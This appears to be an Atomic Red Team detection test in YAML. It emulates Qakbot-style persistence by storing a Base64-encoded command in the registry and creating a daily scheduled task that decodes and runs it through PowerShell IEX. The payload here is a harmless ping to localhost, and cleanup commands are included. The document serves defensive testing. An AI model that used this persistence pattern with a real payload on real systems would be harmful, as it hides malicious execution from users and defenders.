# case01

Source: an Atomic Red Team test (YAML).

<!-- Atomic Red Team test (https://github.com/redcanaryco/atomic-red-team), MIT License, Red Canary. -->

---

attack_technique: T1053.005
display_name: 'Scheduled Task/Job: Scheduled Task'
name: Scheduled Task Executing Base64 Encoded Commands From Registry
auto_generated_guid: e895677d-4f06-49ab-91b6-ae3742d0a2ba
description: "A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.\nThe scheduled task will launch powershell to decode and run the command in the registry daily.\nThis is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n"
supported_platforms:
- windows
input_arguments:
  time:
    description: Daily scheduled task execution time
    type: string
    default: 07:45
executor:
  command: |
    reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
    schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st 07:45
  cleanup_command: |
    schtasks /delete /tn "ATOMIC-T1053.005" /F >nul 2>&1
    reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F >nul 2>&1
  name: command_prompt

